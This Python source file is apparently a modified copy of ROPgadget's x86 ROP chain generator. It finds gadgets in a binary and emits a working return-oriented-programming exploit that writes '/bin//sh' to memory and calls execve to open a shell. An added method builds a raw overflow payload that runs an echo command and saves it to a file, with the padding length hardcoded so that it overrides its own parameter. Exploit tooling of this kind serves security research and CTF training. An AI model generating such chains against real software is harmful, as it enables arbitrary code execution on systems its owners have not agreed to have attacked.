#!/usr/bin/env python3
## -*- coding: utf-8 -*-
##
##  Jonathan Salwan - 2014-05-13
##
##  http://shell-storm.org
##  http://twitter.com/JonathanSalwan
##

import re
from struct import pack


class ROPMakerX86(object):
    def __init__(self, binary, gadgets, padding,liboffset=0x0):
        self.__binary  = binary
        self.__gadgets = gadgets

        # If it's a library, we have the option to add an offset to the addresses
        self.__liboffset = liboffset
        self.padding = padding

        self.__generate()

    def __lookingForWrite4Where(self, gadgetsAlreadyTested):
        for gadget in self.__gadgets:
            if gadget in gadgetsAlreadyTested:
                continue
            f = gadget["gadget"].split(" ; ")[0]
            # regex -> mov dword ptr [r32], r32
            regex = re.search("mov dword ptr \[(?P<dst>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3}))\], (?P<src>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3}))$", f)
            if regex:
                lg = gadget["gadget"].split(" ; ")[1:]
                try:
                    for g in lg:
                        if g.split()[0] != "pop" and g.split()[0] != "ret":
                            raise
                        # we need this to filterout 'ret' instructions with an offset like 'ret 0x6', because they ruin the stack pointer
                        if g != "ret":
                            if g.split()[0] == "ret" and g.split()[1] != "":
                                raise
                    print("\t[+] Gadget found: 0x%x %s" % (gadget["vaddr"], gadget["gadget"]))
                    return [gadget, regex.group("dst"), regex.group("src")]
                except:
                    continue
        return None

    def __lookingForSomeThing(self, something):
        for gadget in self.__gadgets:
            lg = gadget["gadget"].split(" ; ")
            if lg[0] == something:
                try:
                    for g in lg[1:]:
                        if g.split()[0] != "pop" and g.split()[0] != "ret":
                            raise
                        # we need this to filterout 'ret' instructions with an offset like 'ret 0x6', because they ruin the stack pointer
                        if g != "ret":
                            if g.split()[0] == "ret" and g.split()[1] != "":
                                raise
                    print("\t[+] Gadget found: 0x%x %s" % (gadget["vaddr"], gadget["gadget"]))
                    return gadget
                except:
                    continue
        return None

    def __padding(self, gadget, regAlreadSetted):
        lg = gadget["gadget"].split(" ; ")
        for g in lg[1:]:
            if g.split()[0] == "pop":
                reg = g.split()[1]
                try:
                    print("\tp += pack('<I', 0x%08x) # padding without overwrite %s" % (regAlreadSetted[reg], reg))
                except KeyError:
                    print("\tp += pack('<I', 0x41414141) # padding")

    def __custompadding(self, gadget, regAlreadSetted):
        lg = gadget["gadget"].split(" ; ")
        for g in lg[1:]:
            if g.split()[0] == "pop":
                reg = g.split()[1]
                try:
                    tmp = "{:08x}".format(regAlreadSetted[reg])
                    return pack('<I', int(tmp,16))
                except KeyError:
                    return pack('<I', 0x41414141)
        return b''

    def __buildRopChain(self, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall):

        sects = self.__binary.getDataSections()
        dataAddr = None
        for s in sects:
            if s["name"] == ".data":
                dataAddr = s["vaddr"] + self.__liboffset
        if dataAddr is None:
            print("\n[-] Error - Can't find a writable section")
            return

        print("#!/usr/bin/env python3")
        print("# execve generated by ROPgadget\n")
        print("from struct import pack\n")

        print("# Padding goes here")
        print("p = b''\n")

        print("p += pack('<I', 0x%08x) # %s" % (popDst["vaddr"], popDst["gadget"]))
        print("p += pack('<I', 0x%08x) # @ .data" % dataAddr)
        self.__padding(popDst, {})

        print("p += pack('<I', 0x%08x) # %s" % (popSrc["vaddr"], popSrc["gadget"]))
        print("p += b'/bin'")
        self.__padding(popSrc, {popDst["gadget"].split()[1]: dataAddr})  # Don't overwrite reg dst

        print("p += pack('<I', 0x%08x) # %s" % (write4where["vaddr"], write4where["gadget"]))
        self.__padding(write4where, {})

        print("p += pack('<I', 0x%08x) # %s" % (popDst["vaddr"], popDst["gadget"]))
        print("p += pack('<I', 0x%08x) # @ .data + 4" % (dataAddr + 4))
        self.__padding(popDst, {})

        print("p += pack('<I', 0x%08x) # %s" % (popSrc["vaddr"], popSrc["gadget"]))
        print("p += b'//sh'")
        self.__padding(popSrc, {popDst["gadget"].split()[1]: dataAddr + 4})  # Don't overwrite reg dst
        print("p += pack('<I', 0x%08x) # %s" % (write4where["vaddr"], write4where["gadget"]))
        self.__padding(write4where, {})

        print("p += pack('<I', 0x%08x) # %s" % (popDst["vaddr"], popDst["gadget"]))
        print("p += pack('<I', 0x%08x) # @ .data + 8" % (dataAddr + 8))
        self.__padding(popDst, {})

        print("p += pack('<I', 0x%08x) # %s" % (xorSrc["vaddr"], xorSrc["gadget"]))
        self.__padding(xorSrc, {})

        print("p += pack('<I', 0x%08x) # %s" % (write4where["vaddr"], write4where["gadget"]))
        self.__padding(write4where, {})

        print("p += pack('<I', 0x%08x) # %s" % (popEbx["vaddr"], popEbx["gadget"]))
        print("p += pack('<I', 0x%08x) # @ .data" % dataAddr)
        self.__padding(popEbx, {})

        print("p += pack('<I', 0x%08x) # %s" % (popEcx["vaddr"], popEcx["gadget"]))
        print("p += pack('<I', 0x%08x) # @ .data + 8" % (dataAddr + 8))
        self.__padding(popEcx, {"ebx": dataAddr})  # Don't overwrite ebx

        print("p += pack('<I', 0x%08x) # %s" % (popEdx["vaddr"], popEdx["gadget"]))
        print("p += pack('<I', 0x%08x) # @ .data + 8" % (dataAddr + 8))
        self.__padding(popEdx, {"ebx": dataAddr, "ecx": dataAddr + 8})  # Don't overwrite ebx and ecx

        print("p += pack('<I', 0x%08x) # %s" % (xorEax["vaddr"], xorEax["gadget"]))
        self.__padding(xorEax, {"ebx": dataAddr, "ecx": dataAddr + 8})  # Don't overwrite ebx and ecx

        for _ in range(11):
            print("p += pack('<I', 0x%08x) # %s" % (incEax["vaddr"], incEax["gadget"]))
            self.__padding(incEax, {"ebx": dataAddr, "ecx": dataAddr + 8})  # Don't overwrite ebx and ecx

        print("p += pack('<I', 0x%08x) # %s" % (syscall["vaddr"], syscall["gadget"]))

    def customRopChain(self, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall):

        sects = self.__binary.getDataSections()
        dataAddr = None
        for s in sects:
            if s["name"] == ".data":
                dataAddr = s["vaddr"] + self.__liboffset
        if dataAddr is None:
            print("\n[-] Error - Can't find a writable section")
            return

        p = b'A' * self.padding
        p = b'A' * 44

        #-----------------------------stack--------------------------

        
        p += pack('<I', popDst["vaddr"]) 
        p += pack('<I', dataAddr) 
        p += self.__custompadding(popDst, {})

        p += pack('<I', popSrc["vaddr"]) 
        p += b'/bin'
        p += self.__custompadding(popSrc, {popDst["gadget"].split()[1]: dataAddr})  # Don't overwrite reg dst

        p += pack('<I', write4where["vaddr"]) 
        p += self.__custompadding(write4where, {})     
        
        #writes /bin on stack

        p += pack('<I', popDst["vaddr"]) 
        p += pack('<I', dataAddr+4) 
        p += self.__custompadding(popDst, {})

        p += pack('<I', popSrc["vaddr"]) 
        p += b'////'
        p += self.__custompadding(popSrc, {popDst["gadget"].split()[1]: dataAddr})  # Don't overwrite reg dst

        p += pack('<I', write4where["vaddr"]) 
        p += self.__custompadding(write4where, {})     
        
        #writes //// on stack

        p += pack('<I', popDst["vaddr"]) 
        p += pack('<I', dataAddr+8) 
        p += self.__custompadding(popDst, {})

        p += pack('<I', popSrc["vaddr"]) 
        p += b'echo'
        p += self.__custompadding(popSrc, {popDst["gadget"].split()[1]: dataAddr})  # Don't overwrite reg dst

        p += pack('<I', write4where["vaddr"]) 
        p += self.__custompadding(write4where, {})     
        
        #writes /ech on stack

        p += pack('<I', popDst["vaddr"]) 
        p += pack('<I', dataAddr + 12) 
        p += self.__custompadding(popDst, {})

        p += pack('<I', xorSrc["vaddr"]) 
        p += self.__custompadding(xorSrc, {})

        p += pack('<I', write4where["vaddr"]) 
        p += self.__custompadding(write4where, {})

        #writes null byte at the end

        p += pack('<I', popDst["vaddr"]) 
        p += pack('<I', dataAddr + 13) 
        p += self.__custompadding(popDst, {})

        p += pack('<I', popSrc["vaddr"]) 
        p += b'rop '
        p += self.__custompadding(popSrc, {popDst["gadget"].split()[1]: dataAddr + 5})  # Don't overwrite reg dst

        p += pack('<I', write4where["vaddr"]) 
        p += self.__custompadding(write4where, {})

        #writes "rop " on the stack 

        p += pack('<I', popDst["vaddr"]) 
        p += pack('<I', dataAddr + 17) 
        p += self.__custompadding(popDst, {})

        p += pack('<I', popSrc["vaddr"]) 
        p += b'done'
        p += self.__custompadding(popSrc, {popDst["gadget"].split()[1]: dataAddr + 5})  # Don't overwrite reg dst

        p += pack('<I', write4where["vaddr"]) 
        p += self.__custompadding(write4where, {})

        #writes "done" on the stack 

        p += pack('<I', popDst["vaddr"]) 
        p += pack('<I', dataAddr + 21) 
        p += self.__custompadding(popDst, {})

        p += pack('<I', xorSrc["vaddr"]) 
        p += self.__custompadding(xorSrc, {})

        p += pack('<I', write4where["vaddr"]) 
        p += self.__custompadding(write4where, {})

        #writes null byte at the end

        #----------------------------------args---------------------------------

        p += pack('<I', popDst["vaddr"]) 
        p += pack('<I', dataAddr + 60) 
        p += self.__custompadding(popDst, {})

        p += pack('<I', popSrc["vaddr"]) 
        p += pack('<I', dataAddr) 
        p += self.__custompadding(popSrc, {popDst["gadget"].split()[1]: dataAddr + 60})  # Don't overwrite reg dst

        p += pack('<I', write4where["vaddr"]) 
        p += self.__custompadding(write4where, {})        

        #writes arg 1 on shadowstack

        p += pack('<I', popDst["vaddr"]) 
        p += pack('<I', dataAddr + 64) 
        p += self.__custompadding(popDst, {})

        p += pack('<I', popSrc["vaddr"]) 
        p += pack('<I', dataAddr + 13) 
        p += self.__custompadding(popSrc, {popDst["gadget"].split()[1]: dataAddr + 64})  

        p += pack('<I', write4where["vaddr"]) 
        p += self.__custompadding(write4where, {})        

        #writes arg 2 on shadowstack

        p += pack('<I', popEbx["vaddr"]) 
        p += pack('<I', dataAddr) 
        p += self.__custompadding(popEbx, {})

        #puts stack in to ebx (program)

        p += pack('<I', popEcx["vaddr"]) 
        p += pack('<I', dataAddr + 60) 
        p += self.__custompadding(popEcx, {"ebx": dataAddr})  

        #puts stack + 60 in to ecx (args)

        p += pack('<I', popEdx["vaddr"]) 
        p += pack('<I', dataAddr + 48) 
        p += self.__custompadding(popEdx, {"ebx": dataAddr, "ecx": dataAddr + 60})  

        #puts stack in to edx (env)

        p += pack('<I', xorEax["vaddr"]) 
        p += self.__custompadding(xorEax, {"ebx": dataAddr, "ecx": dataAddr + 60})  

        for _ in range(11):
            p += pack('<I', incEax["vaddr"]) 
            p += self.__custompadding(incEax, {"ebx": dataAddr, "ecx": dataAddr + 60})  # Don't overwrite ebx and ecx

        #sets eax to 11

        p += pack('<I', syscall["vaddr"]) 

        #runs systemcall

        outputfile = open("paddingbruteforce", "wb")
        outputfile.write(p)
        outputfile.close()

    def __generate(self):

        # To find the smaller gadget
        self.__gadgets.reverse()

        print("\nROP chain generation\n===========================================================")

        print("\n- Step 1 -- Write-what-where gadgets\n")

        gadgetsAlreadyTested = []
        while True:
            write4where = self.__lookingForWrite4Where(gadgetsAlreadyTested)
            if not write4where:
                print("\t[-] Can't find the 'mov dword ptr [r32], r32' gadget")
                return

            popDst = self.__lookingForSomeThing("pop %s" % write4where[1])
            if not popDst:
                print("\t[-] Can't find the 'pop %s' gadget. Try with another 'mov [reg], reg'\n" % write4where[1])
                gadgetsAlreadyTested += [write4where[0]]
                continue

            popSrc = self.__lookingForSomeThing("pop %s" % write4where[2])
            if not popSrc:
                print("\t[-] Can't find the 'pop %s' gadget. Try with another 'mov [reg], reg'\n" % write4where[2])
                gadgetsAlreadyTested += [write4where[0]]
                continue

            xorSrc = self.__lookingForSomeThing("xor %s, %s" % (write4where[2], write4where[2]))
            if not xorSrc:
                print("\t[-] Can't find the 'xor %s, %s' gadget. Try with another 'mov [r], r'\n" % (write4where[2], write4where[2]))
                gadgetsAlreadyTested += [write4where[0]]
                continue
            else:
                break

        print("\n- Step 2 -- Init syscall number gadgets\n")

        xorEax = self.__lookingForSomeThing("xor eax, eax")
        if not xorEax:
            print("\t[-] Can't find the 'xor eax, eax' instruction")
            return

        incEax = self.__lookingForSomeThing("inc eax")
        if not incEax:
            print("\t[-] Can't find the 'inc eax' instruction")
            return

        print("\n- Step 3 -- Init syscall arguments gadgets\n")

        popEbx = self.__lookingForSomeThing("pop ebx")
        if not popEbx:
            print("\t[-] Can't find the 'pop ebx' instruction")
            return

        popEcx = self.__lookingForSomeThing("pop ecx")
        if not popEcx:
            print("\t[-] Can't find the 'pop ecx' instruction")
            return

        popEdx = self.__lookingForSomeThing("pop edx")
        if not popEdx:
            print("\t[-] Can't find the 'pop edx' instruction")
            return

        print("\n- Step 4 -- Syscall gadget\n")

        syscall = self.__lookingForSomeThing("int 0x80")
        if not syscall:
            print("\t[-] Can't find the 'syscall' instruction")
            return

        print("\n- Step 5 -- Build the ROP chain\n")

        self.__buildRopChain(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall)
        self.customRopChain(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall)
